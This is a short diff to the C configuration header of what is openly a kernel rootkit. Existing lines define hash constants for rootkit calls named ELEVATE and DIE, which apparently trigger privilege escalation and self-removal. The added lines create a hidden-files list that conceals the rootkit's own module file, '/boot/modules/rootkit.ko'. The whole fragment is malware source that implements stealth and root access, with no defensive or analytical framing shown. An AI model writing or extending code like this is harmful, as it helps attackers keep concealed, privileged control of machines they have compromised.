@@ -32,4 +32,10 @@
 #define RKCALL_ELEVATE "7c2e28607149c89ec12ede558f021a1428bbe80342249c3febcb15efa6e8e65a"
 #define RKCALL_DIE "41580f3e3b18a4dadf03d128b9fa9ab80a5b6ac088ee5f713559fa7ba59c5a6d"
 
+/* Hidden files. */
+#define NUM_HIDDEN_FILES 1
+static const char *hidden_files[NUM_HIDDEN_FILES] = {
+	"/boot/modules/rootkit.ko",
+};
+
 #endif /* CONFIG_H */
